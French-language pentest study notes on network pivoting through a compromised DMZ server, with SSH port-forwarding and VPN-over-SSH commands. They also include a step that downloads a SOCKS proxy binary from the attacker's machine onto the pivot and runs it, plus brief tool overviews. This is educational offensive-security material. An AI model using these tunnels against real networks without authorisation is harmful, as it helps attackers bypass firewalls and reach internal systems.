# Pivoting

Les notes reprennent largement cet [article](https://orangecyberdefense.com/fr/insights/blog/ethical_hacking/etat-de-lart-du-pivoting-reseau-en-2019/).

Le pivoting ou deplacement lateral consiste à utiliser une machine contrôlée par l’attaquant comme d’un rebond, visant ainsi à augmenter la visibilité du réseau. Autrement dit, c’est le fait d’accéder à un réseau normalement inaccessible, grâce à une machine compromise. 

Cela permet de contourner bon nombre de protections et de mécanismes de surveillance réseau, puisque les attaques seront lancées depuis une machine légitime faisant partie intégrante du réseau de l’organisation cible.

## Cas de firgure

* hack: attaquant : 10.0.0.2
* srv1: serveur vulnérable / pivot : 10.0.0.10 sur internet et 192.168.1.5 sur le réseau de l'entreprise
* srv2: serveur interne à l'entreprise : 192.168.1.2

Le serveur vulnérable est dans la DMZ. 
Habituellement DMZ et réseau interne à l'entreprise sont séparés par un firewall. Ici une exploitation du serveur de la DMZ qui possède un accès publique et un accès interne permet d'accèder au réseau de l'entreprise en montant un tunnel.

## SSH
SSH permet de monter des tunnels de plusieurs façons:
* SSH local port forwarding
* SSH reverse remote port forwarding
* SSH dynamic port forwarding
* SSH reverse remote port forwarding + proxy socks
* VPN over SSH

### SSH local port forwarding
Les connexions depuis le client SSH sont transférées via le serveur SSH puis vers une machine de destination.
**hack -> srv1 -> srv2**

    $ ssh user@ssh_server -L [bind_address:]local_port:destination_host:destination_hostport
    $ ssh user@10.0.0.10 -L 127.0.0.1:32000:192.168.1.2:80 -N
Explication:
* l'utilsateur se connecte au serveur public vulnérable
* il ouvre sur sa machine le port 32000
* `-L` transfère le traffic d'un port local, donc le 32000 vers le port 80 de la machine destination via le pivot
* `-N` permet de ne pas exécuter de commandes après connexions, donc pas de shell puisque SSH sert ici seulement de tunnel

### SSH reverse remote port forwarding
En remote port forwarding, les connexions depuis le serveur SSH sont transférées via le client SSH, puis vers un serveur de destination.
**srv1 -> hack -> srv2**

    $ ssh user@ssh_server -R [bind_address:]remote_port:destination_host:destination_hostport
Cette commande rend accessible un service de hack à tout machine accedant à srv1.
Si on remplace l'adresse de hack, par l'adresse de srv1, il s'expose ainsi au réseau de l'entreprise.

La subtilité ici est de lancer cette commande sur le pivot srv1, d'où le **reverse** remote port forwarding. Ce qui permettra d'accéder à srv2 depuis srv1.

    $ sudo systemctl start sshd // il faut démarrer le serveur en local sur hack pour que srv1 s'y connecte
    $ sudo useradd sshpivot --no-create-home --shell /bin/false // on créé le seul utilisateur habilité à s'y connecté par sécurité
    $ sudo passwd sshpivot // note:/bin/false doit être ajouté dans /etc/shells sinon la connexion est refusé

    $ ssh user@10.0.0.10 // connexion au pivot, puis:
    $ ssh sshpivot@10.0.0.2 -R 127.0.0.1:14000:10.0.0.2:80 -N
Explication:
* depuis le serveur pivot, connexion à la machine attaquant avec le seul user autorisé
* `-R` permet de transferer le trafic du port distant 
* lorsque le port 14000 de srv1 est requêté depuis la machine hack, le trafic est redirigé vers le srv2

### SSH dynamic port forwarding
Les connexions de divers services seront transférées via le client SSH puis via le serveur SSH et, finalement, vers plusieurs machines de destination.

Il faut ouvrir un port sur le pivot, SSH va écouter sur se port pour ensuite fonctionner comme un proxy SOCKS.

    $ ssh user@ssh_server -D [bind_address:]local_port // configurer SSH comme serveur proxy
    $ ssh user@10.0.0.10 -D 127.0.0.1:12000 -N // Connexion au serveur 
L'utilisateur peut don requêter tous les réseaux accessibles par srv1 via le proxy, en adressant le port 12000 de hack. Exemple:

    $ curl --head http://192.168.1.2 --proxy socks5://127.0.0.1:12000
Permet de récupérer les infos du serveur tournant sur srv2 depuis hack

### SSH reverse remote port forwarding + proxy socks
Permet de résoudre le problème de devoir ouvrir les ports un par un en reverse remote port forwarding. Pour cela il faut binder un serveur proxy sur le pivor à la place de la cible.

Pour se faire, un proxy doit être déployer sur le pivot. Il existe par exemple `proxychains` et `proxychains-ng` mais nous allons utilisé `3proxy` qui à l'avantage d'être portable.

Sur la machine, hack, on compile le proxy:

    $ git clone https://github.com/z3APA3A/3proxy.git
    $ cd 3proxy
    $ make -f Makefile.Linux

On créé un serveur http sur hack pour le rendre accessible:

    $ python -m http.server -d bin --bind 10.0.0.10 8080

Puis sur le pivot srv1, on récupère le proxy, et on le lance sur le port 10080:

    $ wget http://10.0.0.10:8080/socks
    $ chmod u+x socks
    $ ./socks '-?'
    $ ./socks -p10080 -tstop -d

Et enfin on lance ssh en reverse remote port forwarding:

    $ ssh sshpivot@10.0.0.10 -R 127.0.0.1:14000:127.0.0.1:10080 -N

Un fois configurer, depuis hack:

    $ curl --head http://192.168.1.2 --proxy socks5://127.0.0.1:14000

### VPN over SSH
Cette fois le tunnel ne sera pas en TCP mais avec une connexion VPN, donc sur la couche 2. Il permettra de lancer des SYN scn avec Nmap par exemple.
C'est par contre assez complexe puisqu'il faut connaitre les creds d'un utilisateur, avoir les droits root, configurer le NAT sur le serveur, créer une interface tun sur le pivot et activer l'ip forwarding donc avoir les droits root, tout ça n'est pas discret et le résultat est lent.

Pour la mise en place il faut:
* utiliser un réseau non utilisé par les deux. Disons 10.1.1.0/30
* autoriser le tun device forwarding en ajoutant `PermitTunnel yes` dans `/etc/ssh/sshd_config`
* créer une interface tun sur la hack et sur le pivot srv1. Il faut donc être root sur srv1. 

Pour cette dernière étape, il y'a une mauvaise solution. Elle consiste à lancer openSSH sur hack, se connecter en root sur srv1 (donc `PermitRootLogin yes` dans `/etc/ssh/sshd_config`):

    $ sudo ssh root@10.0.0.10 -w any:any
avec:
* `-w any:any` laisse openssh choisir automatiquement les numéros (tunX) des interfaces tun respectivement côté client et côté serveur.

La deuxième solution est meilleure, elle consiste à faire le boulot à la main:

Sur le pivot srv1 (10.1.1.1), on créé tun, en définissant le peering et on active:

    $ sudo ip tuntap add dev tun0 mode tun
    $ sudo ip addr add 10.1.1.1/30 peer 10.1.1.2 dev tun0
    $ sudo ip link set tun0 up

Idem sur hack (10.1.1.2):

    $ sudo ip tuntap add dev tun0 mode tun
    $ sudo ip addr add 10.1.1.2/30 peer 10.1.1.1 dev tun0
    $ sudo ip link set tun0 up

Puis sur hack, l'utilisateur lance VPN over SSH en spécifiant les numéros des interfaces (`-w`):

    $ ssh user@10.0.0.2 -w 0:0

On `ping 10.1.1.1` pour tester le tunnel.

Une fois le tunnel établi, il faut activer l'ip forwarding, donc sur srv1:

    $ sudo sysctl net.ipv4.conf.default.forwarding=1
Utiliser `sysctl` permet d'éviter de se connecter en root.

Une fois l'ip forwarding activé, il faut configurer le routage sur srv1:

    $ sudo iptables -t nat -A POSTROUTING -s 10.1.1.2 -o eth1 -j MASQUERADE
    $ sudo iptables -t nat -A POSTROUTING -s 10.1.1.2 -d 10.0.0.0/24 -j MASQUERADE
La source est la machine attaquante et l'interface permettant l'accès est eth1 ou le réseau lui même.

Plutôt que le NAT, il est possible d’obtenir le même résultat en mettant en place un proxy ARP:

    $ sudo sysctl net.ipv4.conf.eth0.proxy_arp=1 // all pour toutes les interfaces, ou eth0 pour cette interface
    $ sudo ip neigh add proxy 10.1.1.2 dev eth0 // déclare l’IP diffusée en ARP dans le réseau distant et spécifie son interface

Une fois mis en place que ce soit avec NAT ou ARP, la dernière étape sur la machine hack, est d'ajouter la route vers le réseau distant:    

    $ sudo ip route add 10.0.0.0/24 via 10.1.1.1

## Quelques outils

### sshuttle
[sshuttle](https://github.com/sshuttle/sshuttle) fonctionne comme un proxy transparent à travers ssh. Pour transfrérer le trafic vers le réseau interne via le pivot srv1:

    $ sshuttle -r user@10.0.0.10 10.0.0.0/24
puis:

    $ curl --head http://10.0.0.2

Activer le premier niveaux de verbose avec l'option `-vNr` pour voir le travail sur les règles créées sur iptables.

### Metasploit : autoroute, proxy et local port forwarding ou double pivoting
A partir d'un shell meterpreter sur le pivot srv1, il est possible de faire du de routage, du proxying et du port forwarding.

Le double pivoting consiste à exploiter srv2 de la même façon que srv1 si nous trouvons une faille dessus.

### Ncat à ne pas confondre avec netcat
Ncat est une version largement améliorée de Netcat développée par l’équipe de Nmap. D’ailleurs, dans beaucoup de distributions Linux, ncat est souvent disponible dans le même package que nmap (ex : ArchLinux), alors que dans d’autres distributions ncat est disponible dans un package séparé (ex : OpenSUSE).

### Chisel pour un tunnel HTTP
[Chisel](https://github.com/jpillora/chisel) est un outil très puissant qui va encapsuler une session TCP dans un tunnel HTTP (un peu à la manière de Tunna ou reGeorg que nous verrons plus tard) tout en le sécurisant via SSH (dans le même style que sshuttle).

Chisel est un competitor-killer, il est facile à utiliser, performant. Toutes les communications sont chiffrées grâce à SSH, il supporte l’authentification mutuelle (login/mot de passe pour le client, correspondance du fingerpint pour le serveur), reconnexion automatique, et embarque son propre serveur proxy SOCKS 5.

### VPN Pivot : tunnel VPN
[VPNPivot](https://github.com/0x36/VPNPivot) fonctionne essentiellement comme la technique de VPN over SSH sauf que le chiffrement est assuré par SSL/TLS et pas par SSH.

### PivotSuite
[PivotSuite](https://github.com/RedTeamOperations/PivotSuite) est un outil qui va permettre de mettre en place l’équivalent d’un SSH [local|reverse remote|reverse dynamic] port forwarding mais qui supporte en plus l’UDP over TCP, le pivoting multi-niveau (comme nous avons vu avec Metasploit), l’énumération réseau et serveur proxy SOCK5 inclus.